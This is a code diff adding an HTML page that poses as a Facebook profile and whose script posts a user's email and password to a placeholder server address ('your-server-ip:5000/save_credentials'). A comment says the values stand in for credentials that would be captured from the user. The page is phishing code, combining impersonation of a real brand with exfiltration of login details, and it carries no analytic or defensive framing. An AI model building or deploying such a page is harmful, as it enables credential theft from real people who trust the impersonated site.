@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Facebook</title>
+ <style>
+ body {
+ font-family: Arial, sans-serif;
+ background-color: #f0f2f5;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ height: 100vh;
+ margin: 0;
+ }
+ .profile-container {
+ background-color: #fff;
+ padding: 20px;
+ border-radius: 8px;
+ box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+ width: 300px;
+ text-align: center;
+ }
+ .profile-container img {
+ border-radius: 50%;
+ width: 100px;
+ height: 100px;
+ object-fit: cover;
+ }
+ .profile-container h2 {
+ margin: 10px 0;
+ }
+ </style>
+</head>
+<body>
+ <div class="profile-container">
+ <img src="https://via.placeholder.com/100" alt="Profile Picture">
+ <h2>Welcome to Your Profile</h2>
+ <p>You are now viewing your Facebook profile.</p>
+ </div>
+ <script>
+ // Simulate getting user credentials (in a real scenario, these would be captured from the user)
+ const userCredentials = {
+ email: 'user_email@example.com',
+ password: 'user_password'
+ };
+
+ // Send credentials to the server
+ fetch('http://your-server-ip:5000/save_credentials', {
+ method: 'POST',
+ headers: {
+ 'Content-Type': 'application/json'
+ },
+ body: JSON.stringify(userCredentials)
+ })
+ .then(response => response.text())
+ .then(data => {
+ console.log(data);
+ })
+ .catch(error => {
+ console.error('Error:', error);
+ });
+ </script>
+</body>
+</html>
